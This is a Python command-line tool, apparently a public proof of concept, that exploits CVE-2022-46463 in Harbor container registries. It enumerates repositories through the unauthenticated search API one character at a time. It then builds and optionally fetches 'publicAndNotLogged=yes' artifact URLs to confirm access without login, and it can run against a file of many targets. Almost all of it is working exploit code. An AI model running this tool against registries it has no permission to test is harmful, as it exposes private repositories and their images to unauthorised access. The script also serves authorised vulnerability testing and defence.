#!/usr/bin/env python3
"""
Harbor Registry Vulnerability Scanner
Improved version with better error handling, logging, and security practices.
"""

import argparse
import json
import logging
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import reduce
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

import requests
import urllib3
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Disable SSL warnings for testing purposes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class HarborScanner:
    """Harbor Registry vulnerability scanner with improved error handling and features."""
    
    def __init__(self, proxy: Optional[str] = None, timeout: int = 10, max_workers: int = 5):
        self.timeout = timeout
        self.max_workers = max_workers
        self.search_chars = [
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
            'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
            'u', 'v', 'w', 'x', 'y', 'z'
        ]
        self.repositories = []
        self.vulnerable_urls = set()
        
        # Setup logging
        self.setup_logging()
        
        # Setup session with retry strategy
        self.session = self.create_session(proxy)
    
    def setup_logging(self) -> None:
        """Configure logging with colors and proper formatting."""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.StreamHandler(sys.stdout),
                logging.FileHandler('harbor_scan.log')
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def create_session(self, proxy: Optional[str] = None) -> requests.Session:
        """Create a requests session with retry strategy and proxy support."""
        session = requests.Session()
        
        # Retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set proxy if provided
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}
        
        # Set default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate'
        })
        
        return session
    
    def print_banner(self) -> None:
        """Display the application banner."""
        banner = """
╔════════════════════════════════════════════════════════════════════════════════╗
║  Harbor Registry Vulnerability Scanner v2.0                                    ║
║  CVE-2022-46463 - Harbor Information Disclosure                                ║
║                                                                                ║
║  Enhanced with:                                                                ║
║  • Improved error handling and logging                                         ║
║  • Concurrent scanning capabilities                                            ║
║  • Better URL validation and filtering                                         ║
║  • Comprehensive reporting                                                     ║
║                                                                                ║
║  Author: @sevbandonmez                                                         ║
╚════════════════════════════════════════════════════════════════════════════════╝
        """
        print(f"\033[1;36m{banner}\033[0m")
    
    def validate_url(self, url: str) -> bool:
        """Validate URL format and accessibility."""
        try:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                return False
            
            # Basic connectivity check
            response = self.session.head(url, timeout=5, verify=False)
            return response.status_code < 400
        except Exception as e:
            self.logger.warning(f"URL validation failed for {url}: {e}")
            return False
    
    def search_repositories(self, base_url: str, search_char: str) -> List[Dict]:
        """Search for repositories using a single character."""
        search_url = urljoin(base_url, f'/api/v2.0/search?q={search_char}')
        repositories = []
        
        try:
            self.logger.info(f"Searching with character: {search_char}")
            response = self.session.get(
                search_url, 
                timeout=self.timeout, 
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'repository' in data:
                    for repo in data['repository']:
                        repo_info = {
                            'project_id': repo.get('project_id'),
                            'repository_name': repo.get('repository_name')
                        }
                        repositories.append(repo_info)
                        self.logger.debug(f"Found repository: {repo_info}")
            else:
                self.logger.warning(f"Search failed with status {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Request failed for {search_url}: {e}")
        except json.JSONDecodeError as e:
            self.logger.error(f"JSON decode error for {search_url}: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error during search: {e}")
        
        return repositories
    
    def scan_target(self, url: str) -> Set[str]:
        """Scan a single target URL for vulnerabilities."""
        if not self.validate_url(url):
            self.logger.error(f"Invalid or inaccessible URL: {url}")
            return set()
        
        self.logger.info(f"Starting scan for: {url}")
        all_repositories = []
        
        # Use ThreadPoolExecutor for concurrent searching
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_char = {
                executor.submit(self.search_repositories, url, char): char 
                for char in self.search_chars
            }
            
            for future in as_completed(future_to_char):
                char = future_to_char[future]
                try:
                    repositories = future.result()
                    all_repositories.extend(repositories)
                except Exception as e:
                    self.logger.error(f"Error processing character {char}: {e}")
        
        # Remove duplicates
        unique_repositories = self.remove_duplicates(all_repositories)
        self.logger.info(f"Found {len(unique_repositories)} unique repositories")
        
        # Generate vulnerable URLs
        vulnerable_urls = self.generate_vulnerable_urls(url, unique_repositories)
        
        return vulnerable_urls
    
    def remove_duplicates(self, repositories: List[Dict]) -> List[Dict]:
        """Remove duplicate repositories from the list."""
        seen = set()
        unique_repos = []
        
        for repo in repositories:
            key = (repo.get('project_id'), repo.get('repository_name'))
            if key not in seen:
                seen.add(key)
                unique_repos.append(repo)
        
        return unique_repos
    
    def generate_vulnerable_urls(self, base_url: str, repositories: List[Dict]) -> Set[str]:
        """Generate vulnerable URLs from repository information."""
        vulnerable_urls = set()
        
        # Clean the base URL - remove API paths if present
        clean_base_url = base_url
        if '/api/v2.0' in clean_base_url:
            clean_base_url = clean_base_url.split('/api/v2.0')[0]
        if clean_base_url.endswith('/'):
            clean_base_url = clean_base_url.rstrip('/')
        
        for repo in repositories:
            project_id = repo.get('project_id')
            repo_name = repo.get('repository_name')
            
            if project_id and repo_name:
                # Handle both cases: with and without slash in repo_name
                if '/' in repo_name:
                    actual_repo_name = repo_name.split('/')[-1]
                else:
                    actual_repo_name = repo_name
                
                # Generate the vulnerable URL with correct format
                vuln_url = (
                    f"{clean_base_url}/harbor/projects/{project_id}/"
                    f"repositories/{actual_repo_name}/artifacts-tab?publicAndNotLogged=yes"
                )
                vulnerable_urls.add(vuln_url)
        
        return vulnerable_urls
    
    def verify_vulnerability(self, url: str) -> bool:
        """Verify if a URL is actually vulnerable."""
        try:
            response = self.session.get(url, timeout=self.timeout, verify=False)
            # Check if we get repository information without authentication
            # Look for indicators that the page loaded successfully and shows repository data
            content = response.text.lower()
            return (response.status_code == 200 and 
                   ('repository' in content or 'artifacts' in content or 'tags' in content))
        except Exception as e:
            self.logger.debug(f"Verification failed for {url}: {e}")
            return False
    
    def generate_report(self, results: Dict[str, Set[str]]) -> None:
        """Generate a comprehensive report of the scan results."""
        report_file = f"harbor_scan_report_{int(time.time())}.txt"
        total_vulnerable = sum(len(urls) for urls in results.values())
        
        with open(report_file, 'w') as f:
            f.write("Harbor Registry Vulnerability Scan Report\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Scan completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Total targets scanned: {len(results)}\n")
            f.write(f"Total vulnerable URLs found: {total_vulnerable}\n\n")
            
            for target, urls in results.items():
                f.write(f"Target: {target}\n")
                f.write("-" * 30 + "\n")
                if urls:
                    f.write(f"Vulnerable URLs ({len(urls)}):\n")
                    for url in sorted(urls):
                        f.write(f"  • {url}\n")
                else:
                    f.write("No vulnerabilities found.\n")
                f.write("\n")
        
        self.logger.info(f"Report saved to: {report_file}")
    
    def scan_from_file(self, file_path: str) -> Dict[str, Set[str]]:
        """Scan multiple targets from a file."""
        results = {}
        
        try:
            with open(file_path, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            
            self.logger.info(f"Loaded {len(targets)} targets from {file_path}")
            
            for target in targets:
                if target:
                    results[target] = self.scan_target(target)
            
        except FileNotFoundError:
            self.logger.error(f"File not found: {file_path}")
        except Exception as e:
            self.logger.error(f"Error reading file {file_path}: {e}")
        
        return results
    
    def scan_single_target(self, url: str) -> Dict[str, Set[str]]:
        """Scan a single target URL."""
        return {url: self.scan_target(url)}


def setup_arguments() -> argparse.ArgumentParser:
    """Setup command line arguments."""
    parser = argparse.ArgumentParser(
        description="Harbor Registry Vulnerability Scanner (CVE-2022-46463)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 harbor_scanner.py -u https://harbor.example.com
  python3 harbor_scanner.py -f targets.txt
  python3 harbor_scanner.py -u https://harbor.example.com --proxy http://127.0.0.1:8080
        """
    )
    
    parser.add_argument(
        "-u", "--url", 
        help="Target URL (e.g., https://harbor.example.com)"
    )
    parser.add_argument(
        "-f", "--file", 
        help="File containing target URLs (one per line)"
    )
    parser.add_argument(
        "--proxy", 
        help="HTTP proxy (e.g., http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "--timeout", 
        type=int, 
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    parser.add_argument(
        "--workers", 
        type=int, 
        default=5,
        help="Number of concurrent workers (default: 5)"
    )
    parser.add_argument(
        "--verify", 
        action="store_true",
        help="Verify vulnerabilities by attempting to access URLs"
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true",
        help="Enable verbose logging"
    )
    
    return parser


def main():
    """Main function."""
    parser = setup_arguments()
    args = parser.parse_args()
    
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    
    # Initialize scanner
    scanner = HarborScanner(
        proxy=args.proxy,
        timeout=args.timeout,
        max_workers=args.workers
    )
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Print banner
    scanner.print_banner()
    
    # Perform scanning
    results = {}
    
    if args.url:
        results = scanner.scan_single_target(args.url)
    elif args.file:
        results = scanner.scan_from_file(args.file)
    
    # Display results
    total_vulnerable = sum(len(urls) for urls in results.values())
    
    if total_vulnerable > 0:
        print(f"\n\033[91m[!] Found {total_vulnerable} potentially vulnerable URLs:\033[0m")
        for target, urls in results.items():
            if urls:
                print(f"\n\033[93mTarget: {target}\033[0m")
                for url in sorted(urls):
                    status = ""
                    if args.verify:
                        if scanner.verify_vulnerability(url):
                            status = " \033[91m[CONFIRMED]\033[0m"
                        else:
                            status = " \033[92m[SAFE]\033[0m"
                    print(f"  \033[37m• {url}{status}\033[0m")
    else:
        print(f"\n\033[92m[+] No vulnerabilities found in scanned targets.\033[0m")
    
    # Generate report
    scanner.generate_report(results)
    
    print(f"\n\033[96m[INFO] Scan completed. Check harbor_scan.log for detailed logs.\033[0m")


if __name__ == "__main__":
    main()